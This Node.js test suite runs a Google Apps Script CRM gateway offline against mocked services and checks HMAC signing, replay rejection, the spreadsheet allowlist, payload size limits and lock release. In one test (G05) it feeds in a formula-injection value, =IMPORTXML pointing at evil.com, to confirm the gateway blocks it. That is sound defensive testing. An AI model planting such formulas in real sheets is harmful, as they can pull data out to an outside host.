/**
 * TASK 5H.11C — OFFLINE APPS SCRIPT GATEWAY SECURITY HARNESS TEST SUITE
 *
 * Extracts the actual JavaScript gateway from TASK_5H_4_GOOGLE_APPS_SCRIPT_SOURCE.md
 * and executes doPost(e) inside a Node.js vm sandbox with mocked Apps Script services
 * against real envelopes signed by src/lib/google-sheets/google-auth.ts.
 *
 * Execution Mode: 100% Offline (Mock Integration Test — NOT a live Google execution).
 */

const { describe, it, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const Module = require('node:module');
const path = require('node:path');
const ts = require('typescript');
const vm = require('node:vm');

const ROOT_DIR = path.resolve(__dirname, '..');
const SRC_DIR = path.join(ROOT_DIR, 'src');

const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function (request, parent, isMain, options) {
  if (request.startsWith('@/')) {
    const candidate = path.join(SRC_DIR, request.slice(2));
    for (const c of [candidate, `${candidate}.ts`, path.join(candidate, 'index.ts')]) {
      if (fs.existsSync(c) && fs.statSync(c).isFile()) return c;
    }
  }
  return origResolveFilename.call(this, request, parent, isMain, options);
};

require.extensions['.ts'] = function (mod, filename) {
  const source = fs.readFileSync(filename, 'utf8');
  const compiled = ts.transpileModule(source, {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, esModuleInterop: true },
    fileName: filename
  });
  mod._compile(compiled.outputText, filename);
};

const { signAppsScriptGatewayRequest } = require('../src/lib/google-sheets/google-auth.ts');
const { SHEET_COLUMNS } = require('../src/lib/google-sheets/sheet-schema.ts');

const GAS_MD = fs.readFileSync(
  path.join(ROOT_DIR, 'CHATMITRA_CRM_IMPLEMENTATION/40_TASK_5H_4_GOOGLE_SHEETS_IMPLEMENTATION/TASK_5H_4_GOOGLE_APPS_SCRIPT_SOURCE.md'),
  'utf8'
);
const codeMatch = GAS_MD.match(/```javascript\r?\n([\s\S]*?)```/);
assert.ok(codeMatch, 'JavaScript code block must exist in TASK_5H_4_GOOGLE_APPS_SCRIPT_SOURCE.md');
const GAS_CODE = codeMatch[1];

const TEST_SECRET = 'test_5h11c_hmac_secret_0123456789abcdef';
const TEST_SPREADSHEET_ID = 'TEST_SHEET_ID_ISOLATED_001';

function createGasHarness(opts = {}) {
  const props = new Map([
    ['GATEWAY_HMAC_SECRET', opts.secret !== undefined ? opts.secret : TEST_SECRET],
    ['ALLOWED_SPREADSHEET_ID', opts.allowedId !== undefined ? opts.allowedId : TEST_SPREADSHEET_ID]
  ]);
  const cacheMap = new Map();
  const sheetsMap = new Map();
  for (const [tab, cols] of Object.entries(SHEET_COLUMNS)) {
    sheetsMap.set(tab, [[...cols]]);
  }

  let lockAcquiredCount = 0;
  let lockReleasedCount = 0;
  let hasLockFlag = false;

  const sandbox = {
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (props.has(k) ? props.get(k) : null)
      })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cacheMap.has(k) ? cacheMap.get(k) : null),
        put: (k, v) => cacheMap.set(k, v)
      })
    },
    LockService: {
      getScriptLock: () => ({
        waitLock: () => {
          lockAcquiredCount++;
          hasLockFlag = true;
        },
        hasLock: () => hasLockFlag,
        releaseLock: () => {
          lockReleasedCount++;
          hasLockFlag = false;
        }
      })
    },
    Utilities: {
      Charset: { UTF_8: 'utf8' },
      computeHmacSha256Signature: (data, secret) => {
        const buf = crypto.createHmac('sha256', secret).update(data, 'utf8').digest();
        return Array.from(buf).map((b) => (b > 127 ? b - 256 : b));
      }
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (txt) => ({
        _txt: txt,
        setMimeType() {
          return { text: txt, json: JSON.parse(txt) };
        }
      })
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getId: () => opts.actualSpreadsheetId || TEST_SPREADSHEET_ID,
        getName: () => 'AVANI_AI_CRM_ISOLATED_TEST',
        getSheetByName: (name) => {
          const data = sheetsMap.get(name);
          if (!data) return null;
          return {
            getName: () => name,
            getLastColumn: () => (data[0] ? data[0].length : 0),
            getLastRow: () => data.length,
            getRange: (r, c, numR, numC) => ({
              getValues: () => data.slice(r - 1, r - 1 + numR).map((row) => row.slice(c - 1, c - 1 + numC)),
              setValues: (vals) => {
                data[r - 1] = [...vals[0]];
              }
            }),
            appendRow: (row) => data.push([...row]),
            deleteRow: (r) => data.splice(r - 1, 1)
          };
        }
      })
    }
  };

  vm.createContext(sandbox);
  vm.runInContext(GAS_CODE, sandbox);

  return {
    invoke: (rawBody) => sandbox.doPost({ postData: { contents: rawBody } }).json,
    getLockStats: () => ({ lockAcquiredCount, lockReleasedCount, hasLockFlag }),
    sheetsMap
  };
}

describe('Task 5H.11C — Offline Apps Script Gateway Security Harness', () => {
  let harness;
  beforeEach(() => {
    harness = createGasHarness();
  });

  it('G01: Valid client-signed HEALTH_CHECK passes end-to-end HMAC verification', () => {
    const env = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_SECRET);
    const res = harness.invoke(env.bodyString);
    assert.equal(res.ok, true);
    assert.equal(res.status, 200);
    assert.equal(res.data.spreadsheetName, 'AVANI_AI_CRM_ISOLATED_TEST');
  });

  it('G02: Invalid signature, missing signature, and modified payload are rejected with 401', () => {
    const env = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_SECRET);
    const parsed = JSON.parse(env.bodyString);

    const badSig = harness.invoke(JSON.stringify({ ...parsed, signature: '0'.repeat(64) }));
    assert.equal(badSig.ok, false);
    assert.equal(badSig.status, 401);

    const noSig = harness.invoke(JSON.stringify({ ...parsed, signature: '' }));
    assert.equal(noSig.ok, false);
    assert.equal(noSig.status, 401);

    const tampered = harness.invoke(JSON.stringify({ ...parsed, payloadJson: JSON.stringify({ action: 'GET_ALL', tab: 'CUSTOMERS' }) }));
    assert.equal(tampered.ok, false);
    assert.equal(tampered.status, 401);
  });

  it('G03: Expired timestamp (>300s) and replayed requestId are rejected with 401', () => {
    const expiredEnv = signAppsScriptGatewayRequest(
      { action: 'HEALTH_CHECK' },
      TEST_SECRET,
      { timestampMs: Date.now() - 400000 }
    );
    assert.equal(harness.invoke(expiredEnv.bodyString).status, 401);

    const freshEnv = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_SECRET);
    assert.equal(harness.invoke(freshEnv.bodyString).status, 200);
    // Replay same signed envelope
    const replayRes = harness.invoke(freshEnv.bodyString);
    assert.equal(replayRes.ok, false);
    assert.equal(replayRes.status, 401);
    assert.match(replayRes.error, /Replayed/i);
  });

  it('G04: Missing or mismatched ALLOWED_SPREADSHEET_ID fails closed (403) and caller spreadsheetId is rejected (400)', () => {
    const missingAllow = createGasHarness({ allowedId: '' });
    const env1 = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_SECRET);
    assert.equal(missingAllow.invoke(env1.bodyString).status, 403);

    const wrongSheet = createGasHarness({ actualSpreadsheetId: 'PROD_SHEET_UNRELATED_999' });
    const env2 = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_SECRET);
    assert.equal(wrongSheet.invoke(env2.bodyString).status, 403);

    const callerOverride = signAppsScriptGatewayRequest(
      { action: 'HEALTH_CHECK', spreadsheetId: 'EVIL_SHEET_ID' },
      TEST_SECRET
    );
    assert.equal(harness.invoke(callerOverride.bodyString).status, 400);
  });

  it('G05: Oversized >64KB payload (400), malformed JSON (503/400), and formula injection (400) are blocked with lock released', () => {
    const bigBody = 'x'.repeat(70000);
    assert.equal(harness.invoke(bigBody).status, 400);

    const formulaEnv = signAppsScriptGatewayRequest(
      {
        action: 'UPSERT_ROW',
        tab: 'CUSTOMERS',
        primaryKeyColumn: 'customer_id',
        primaryKeyValue: 'TEST_CUST_01',
        rowValues: ['TEST_CUST_01', '=IMPORTXML("http://evil.com","//a")', '+919000000001', 'Pune', 'TEST', '2026-11-19T00:00:00Z', '2026-11-19T00:00:00Z', 'ACTIVE']
      },
      TEST_SECRET
    );
    const fRes = harness.invoke(formulaEnv.bodyString);
    assert.equal(fRes.ok, false);
    assert.equal(fRes.status, 400);
    assert.equal(fRes.code, 'GOOGLE_SHEETS_FORMULA_INJECTION_BLOCKED');

    const lockStats = harness.getLockStats();
    assert.equal(lockStats.lockAcquiredCount, 1);
    assert.equal(lockStats.lockReleasedCount, 1);
    assert.equal(lockStats.hasLockFlag, false);
  });

  it('G06: Synthetic TEST_ UPSERT_ROW, INSERT_IF_ABSENT, GET_SNAPSHOT, and DELETE_ROW succeed and release locks', () => {
    const row = ['TEST_CUST_01', 'Test Customer', '+919000000001', 'Latur', 'TEST', '2026-11-19T00:00:00Z', '2026-11-19T00:00:00Z', 'ACTIVE'];

    const ins1 = harness.invoke(
      signAppsScriptGatewayRequest({ action: 'INSERT_IF_ABSENT', tab: 'CUSTOMERS', primaryKeyColumn: 'customer_id', primaryKeyValue: 'TEST_CUST_01', rowValues: row }, TEST_SECRET).bodyString
    );
    assert.equal(ins1.ok, true);
    assert.equal(ins1.data.inserted, true);

    const ins2 = harness.invoke(
      signAppsScriptGatewayRequest({ action: 'INSERT_IF_ABSENT', tab: 'CUSTOMERS', primaryKeyColumn: 'customer_id', primaryKeyValue: 'TEST_CUST_01', rowValues: row }, TEST_SECRET).bodyString
    );
    assert.equal(ins2.ok, true);
    assert.equal(ins2.data.inserted, false);

    const snap = harness.invoke(
      signAppsScriptGatewayRequest({ action: 'GET_SNAPSHOT', tabs: ['CUSTOMERS', 'LEADS'] }, TEST_SECRET).bodyString
    );
    assert.equal(snap.ok, true);
    assert.equal(snap.data.tabs.CUSTOMERS.rows.length, 1);

    const del = harness.invoke(
      signAppsScriptGatewayRequest({ action: 'DELETE_ROW', tab: 'CUSTOMERS', primaryKeyColumn: 'customer_id', primaryKeyValue: 'TEST_CUST_01' }, TEST_SECRET).bodyString
    );
    assert.equal(del.ok, true);
    assert.equal(del.data.deleted, true);

    const lockStats = harness.getLockStats();
    assert.equal(lockStats.lockAcquiredCount, lockStats.lockReleasedCount);
    assert.equal(lockStats.hasLockFlag, false);
  });
});
